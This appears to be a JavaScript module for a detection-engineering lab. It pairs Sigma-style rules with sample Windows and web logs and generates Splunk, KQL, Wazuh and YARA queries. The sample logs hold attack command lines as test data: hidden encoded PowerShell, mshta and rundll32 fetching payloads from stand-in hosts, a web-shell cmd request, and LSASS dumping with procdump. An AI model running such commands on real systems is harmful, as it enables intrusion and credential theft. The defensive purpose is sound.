/* eslint-disable no-useless-escape */
export const DETECTION_LAB_SAMPLES = {
  powershell: {
    label: "Suspicious PowerShell",
    rule: `title: Suspicious PowerShell Encoded Or Hidden Execution
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-NoP'
      - '-W Hidden'
  condition: selection
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
  - Computer
falsepositives:
  - Administrative scripts
  - Endpoint management tooling
tags:
  - attack.t1059.001
level: high`,
    logs: `EventCode=4688 host=WIN-01 user=jpatel ParentImage=C:\\Program Files\\Microsoft Office\root\Office16\WINWORD.EXE Image=C:\\Windows\\System32\\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA"
EventCode=4688 host=WIN-02 user=admin Image=C:\Windows\System32\cmd.exe CommandLine="cmd.exe /c whoami"`,
  },
  brute: {
    label: "Failed logins",
    rule: `title: Multiple Failed Logons From Same Source
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventCode: 4625
  condition: selection
fields:
  - Account_Name
  - Source_Network_Address
  - Computer
falsepositives:
  - Password mistakes
  - Service account password rotation issues
tags:
  - attack.t1110
level: medium`,
    logs: `EventCode=4625 Account_Name=jpatel Source_Network_Address=203.0.113.22 Computer=DC01 Failure_Reason="Bad password"
EventCode=4625 Account_Name=jpatel Source_Network_Address=203.0.113.22 Computer=DC01 Failure_Reason="Bad password"
EventCode=4624 Account_Name=jpatel Source_Network_Address=203.0.113.22 Computer=DC01 LogonType=3`,
  },
  login_after_failures: {
    label: "Login after failures",
    rule: `title: Successful Login After Failed Authentication Burst
status: experimental
logsource:
  product: windows
  service: security
detection:
  failed:
    EventCode: 4625
  success:
    EventCode: 4624
  condition: failed and success
fields:
  - Account_Name
  - Source_Network_Address
  - LogonType
falsepositives:
  - User mistyped password before successful login
  - VPN reconnect or password manager retry
tags:
  - attack.t1078
level: high`,
    logs: `EventCode=4625 Account_Name=svc_backup Source_Network_Address=198.51.100.77 Computer=DC01
EventCode=4625 Account_Name=svc_backup Source_Network_Address=198.51.100.77 Computer=DC01
EventCode=4624 Account_Name=svc_backup Source_Network_Address=198.51.100.77 Computer=DC01 LogonType=3`,
  },
  new_service: {
    label: "New service install",
    rule: `title: New Windows Service Installation
status: experimental
logsource:
  product: windows
  service: system
detection:
  selection:
    EventCode: 7045
  condition: selection
fields:
  - ServiceName
  - ImagePath
  - AccountName
falsepositives:
  - Software installers
  - EDR or management agent updates
tags:
  - attack.t1543.003
level: high`,
    logs: `EventCode=7045 host=WIN-APP01 ServiceName=WinUpdateSvc ImagePath="C:\\Users\\Public\\update.exe" AccountName=LocalSystem
EventCode=7036 host=WIN-APP01 ServiceName=Spooler State=running`,
  },
  office_child: {
    label: "Office child process",
    rule: `title: Office Application Spawns Script Interpreter
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    ParentImage|contains:
      - 'WINWORD.EXE'
      - 'EXCEL.EXE'
    Image|contains:
      - 'powershell.exe'
      - 'wscript.exe'
      - 'mshta.exe'
  condition: selection
fields:
  - ParentImage
  - Image
  - CommandLine
falsepositives:
  - Rare business macros or add-ins
tags:
  - attack.t1204.002
  - attack.t1059
level: high`,
    logs: `EventCode=4688 host=WIN-07 ParentImage=C:\\Program Files\\Microsoft Office\root\Office16\WINWORD.EXE Image=C:\\Windows\\System32\\mshta.exe CommandLine="mshta http://192.168.56.10/a.hta"
EventCode=4688 host=WIN-07 ParentImage=C:\Windows\explorer.exe Image=C:\Windows\System32\notepad.exe CommandLine=notepad.exe`,
  },
  webshell: {
    label: "Web shell access",
    rule: `title: Possible Web Shell Access Path
status: experimental
logsource:
  product: webserver
  category: web
detection:
  selection:
    cs-uri-stem|contains:
      - '.php'
      - 'cmd='
      - 'shell'
  condition: selection
fields:
  - src_ip
  - cs-uri-stem
  - user_agent
falsepositives:
  - Admin scripts with command parameters
tags:
  - attack.t1505.003
level: high`,
    logs: `src_ip=203.0.113.50 method=GET cs-uri-stem=/uploads/shell.php?cmd=whoami status=200 user_agent=curl/8.0
src_ip=198.51.100.4 method=GET cs-uri-stem=/index.php status=200 user_agent=Mozilla/5.0`,
  },
  scheduled_task: {
    label: "Scheduled task persistence",
    rule: `title: Suspicious Scheduled Task Creation
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventCode: 4698
  condition: selection
fields:
  - TaskName
  - TaskContent
  - SubjectUserName
falsepositives:
  - Software update jobs
  - Admin automation
tags:
  - attack.t1053.005
level: medium`,
    logs: `EventCode=4698 host=WIN-10 SubjectUserName=jpatel TaskName=\Updater TaskContent="powershell -w hidden -nop"
EventCode=4688 host=WIN-10 Image=C:\\Windows\\System32\\schtasks.exe CommandLine="schtasks /create /tn Updater"`,
  },
  clear_logs: {
    label: "Audit log cleared",
    rule: `title: Windows Security Log Cleared
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventCode: 1102
  condition: selection
fields:
  - SubjectUserName
  - Computer
falsepositives:
  - Rare authorized maintenance
tags:
  - attack.t1070.001
level: critical`,
    logs: `EventCode=1102 host=WIN-DC01 SubjectUserName=administrator Message="The audit log was cleared"
EventCode=4624 host=WIN-DC01 Account_Name=administrator LogonType=10`,
  },
  credential_dumping_lsass: {
    label: "Credential dumping via LSASS",
    rule: `title: Suspicious LSASS Process Access
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: '0x1FFFFF'
  condition: selection
fields:
  - Image
  - TargetImage
  - GrantedAccess
  - User
  - Computer
falsepositives:
  - Legitimate AV or EDR products
  - Microsoft support tools
  - Password change notifications
tags:
  - attack.t1003.001
level: critical`,
    logs: [
      "EventID=10 host=WIN-01 User=admin Image=C:\\Tools\\procdump64.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF",
      "EventID=10 host=WIN-01 User=admin Image=C:\\Windows\\System32\\rundll32.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF",
      "EventCode=4688 host=WIN-01 User=admin Image=C:\\Windows\\System32\\cmd.exe CommandLine=\"taskkill /f /im lsass.exe\"",
    ].join("\n"),
  },
  registry_run_key: {
    label: "Registry Run key persistence",
    rule: `title: Suspicious Registry Run Key Modification
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 13
    TargetObject|contains: '\CurrentVersion\Run'
  condition: selection
fields:
  - Image
  - TargetObject
  - Details
  - User
falsepositives:
  - Software installers adding legitimate autoruns
  - Driver or update packages
tags:
  - attack.t1547.001
level: high`,
    logs: [
      "EventID=13 host=WIN-01 User=jdoe Image=C:\\Windows\\System32\\reg.exe TargetObject=HKU\\...\\CurrentVersion\\Run\\BackupSvc Details=\"C:\\Users\\Public\\svchost.exe\"",
      "EventID=13 host=WIN-01 User=admin Image=C:\\Users\\admin\\installer.exe TargetObject=HKLM\\...\\CurrentVersion\\Run\\Updater Details=\"C:\\Program Files\\Updater\\upd.exe\"",
    ].join("\n"),
  },
  wmi_execution: {
    label: "WMI remote execution",
    rule: `title: WMI Process Creation From Network
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    ParentImage|endswith: '\WmiPrvSE.exe'
  condition: selection
fields:
  - Image
  - ParentImage
  - CommandLine
  - User
  - Computer
falsepositives:
  - Legitimate WMI management tools
  - SCCM or deployment agents
  - Administrator scripts
tags:
  - attack.t1047
level: high`,
    logs: [
      "EventID=1 host=WIN-01 User=admin ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c whoami",
      "EventID=1 host=WIN-01 User=admin ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell -nop -enc SQBFAFgA",
    ].join("\n"),
  },
  lolbin_execution: {
    label: "LOLBin proxy execution",
    rule: `title: Suspicious LOLBin Process Spawning
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    Image|endswith:
      - '\rundll32.exe'
      - '\mshta.exe'
      - '\regsvr32.exe'
      - '\cscript.exe'
      - '\wscript.exe'
    CommandLine|contains:
      - 'http'
      - 'https'
      - 'script'
      - 'shell'
  condition: selection
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Legitimate web-based admin tools
  - Browser helper objects
  - Microsoft update infrastructure
tags:
  - attack.t1218
level: medium`,
    logs: [
      "EventID=1 host=WIN-01 User=jdoe Image=C:\\Windows\\System32\\rundll32.exe CommandLine=rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \"http://malicious.example.com/payload\"",
      "EventID=1 host=WIN-01 User=jdoe Image=C:\\Windows\\System32\\mshta.exe CommandLine=mshta http://malicious.example.com/payload.hta",
      "EventID=1 host=WIN-01 User=admin Image=C:\\Windows\\System32\\cscript.exe CommandLine=cscript.exe C:\\Windows\\System32\\manage-bde.wsf",
    ].join("\n"),
  },
  dns_tunnel: {
    label: "DNS tunneling hint",
    rule: `title: Suspicious Long DNS Query
status: experimental
logsource:
  product: windows
  category: dns_query
detection:
  selection:
    QueryName|contains:
      - '.example.net'
      - 'aaaaaaaa'
  condition: selection
fields:
  - QueryName
  - Image
  - User
falsepositives:
  - CDN tracking domains
  - Long SaaS telemetry hostnames
tags:
  - attack.t1071.004
level: medium`,
    logs: `EventCode=22 host=WIN-03 Image=C:\\Windows\\System32\\WindowsPowerShell\v1.0\powershell.exe QueryName=aaaaaaaaaaaaaaaaaaaaaaaa.payload.example.net
EventCode=22 host=WIN-03 Image=C:\\Program Files\\Browser\browser.exe QueryName=cdn.example.com`,
  },
}

function extractQuotedTerms(rule = "") {
  const terms = []
  for (const match of rule.matchAll(/['"]([^'"]{2,120})['"]/g)) terms.push(match[1])
  for (const match of rule.matchAll(/-\s*([^\n#]{2,120})/g)) {
    const value = match[1].replace(/^['"]|['"]$/g, "").trim()
    if (value && !/^attack\./i.test(value)) terms.push(value)
  }
  return [...new Set(terms.map((term) => term.trim()).filter((term) => term.length >= 2))]
}

function extractEventCodes(rule = "") {
  return [...new Set((rule.match(/(?:EventCode|EventID|event_id)\D{0,8}(\d{3,5})/gi) || [])
    .map((value) => value.match(/\d{3,5}/)?.[0])
    .filter(Boolean))]
}

function extractAttackTags(rule = "") {
  return [...new Set((rule.match(/attack\.t\d{4}(?:\.\d{3})?/gi) || []).map((tag) => tag.replace(/^attack\./i, "T").toUpperCase()))]
}

function escapeRegex(value = "") {
  return String(value).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
}

export function runDetectionLab(rule = "", logs = "") {
  const lines = String(logs).split(/\r?\n/).map((line) => line.trim()).filter(Boolean)
  const terms = extractQuotedTerms(rule)
  const eventCodes = extractEventCodes(rule)
  const attack = extractAttackTags(rule)
  const selectedTerms = [...eventCodes.map((code) => `EventCode=${code}`), ...eventCodes.map((code) => `EventID=${code}`), ...terms]
  const matches = lines.map((line, index) => {
    const matchedTerms = selectedTerms.filter((term) => new RegExp(escapeRegex(term), "i").test(line))
    return { id: `match-${index}`, line, matchedTerms }
  }).filter((item) => item.matchedTerms.length)
  const falsePositiveNotes = []
  if (/powershell/i.test(rule)) falsePositiveNotes.push("Admin scripts, endpoint management, and legitimate automation can use PowerShell. Validate parent process, user, and destination.")
  if (/4625|failed/i.test(rule)) falsePositiveNotes.push("Password mistakes, scanners, expired credentials, or service accounts can create benign failed-login bursts.")
  if (!falsePositiveNotes.length) falsePositiveNotes.push("Document expected admin, scanner, backup, and software-management noise before production use.")
  const review = []
  if (!/falsepositives:/i.test(rule)) review.push("Add false-positive notes before production use.")
  if (!/fields:/i.test(rule)) review.push("List analyst fields to inspect after an alert fires.")
  if (!/logsource:/i.test(rule)) review.push("Define product/service/category logsource.")
  if (!attack.length) review.push("Add ATT&CK tags only when behavior evidence supports them.")
  if (!lines.length) review.push("Add positive and negative sample logs to test the draft.")
  if (!matches.length && lines.length) review.push("No sample events matched. Tune selection terms or field names.")
  return {
    matches,
    terms: selectedTerms,
    attack,
    falsePositiveNotes,
    review,
    matchedCount: matches.length,
    testedCount: lines.length,
    coverage: matches.length ? `${matches.length}/${lines.length} sample line(s) matched` : `0/${lines.length} sample line(s) matched`,
    spl: buildSpl(rule, selectedTerms),
    kql: buildKql(selectedTerms),
    wazuh: buildWazuh(rule, selectedTerms, attack),
    yara: buildYara(rule, selectedTerms),
  }
}

export function buildSpl(rule = "", terms = []) {
  const index = /product:\s*windows/i.test(rule) ? "index=win*" : /product:\s*linux/i.test(rule) ? "index=linux*" : "index=*"
  const queryTerms = terms.slice(0, 6).map((term) => `"${term.replace(/"/g, '\\"')}"`).join(" OR ") || "suspicious"
  return `${index} (${queryTerms})\n| table _time host user source sourcetype EventCode Image CommandLine Message`
}

export function buildKql(terms = []) {
  if (!terms.length) return "*"
  return terms.slice(0, 6).map((term) => `message:*${term.replace(/[:\\]/g, "\\$&")}*`).join(" OR ")
}

export function buildYara(rule = "", terms = []) {
  const title = rule.match(/title:\s*(.+)/i)?.[1]?.trim() || "Detection_Lab"
  const safeTitle = title.replace(/\s+/g, "_").replace(/[^a-zA-Z0-9_]/g, "")
  return [
    `rule ${safeTitle || "beyondarch_candidate"} {`,
    "  meta:",
    `    description = "${title}"`,
    '    author = "BeyondArch Detection Lab"',
    "  strings:",
    ...terms.slice(0, 6).map((term, i) => `    $s${i + 1} = "${term.replace(/"/g, '\\"')}" nocase`),
    "  condition:",
    terms.length ? "    any of them" : "    false",
    "}",
  ].filter(Boolean).join("\n")
}

export function buildWazuh(rule = "", terms = [], attack = []) {
  const title = rule.match(/title:\s*(.+)/i)?.[1]?.trim() || "BeyondArch detection lab candidate"
  const level = /level:\s*high/i.test(rule) ? 10 : /level:\s*medium/i.test(rule) ? 7 : 5
  return [`<group name="beyondarch_detection_lab,">`, `  <rule id="110001" level="${level}">`, `    <description>${title}</description>`, terms[0] ? `    <match>${terms[0]}</match>` : `    <match>suspicious</match>`, attack.length ? `    <group>${attack.map((item) => `attack.${item.toLowerCase()}`).join(",")},</group>` : "", `  </rule>`, `</group>`].filter(Boolean).join("\n")
}
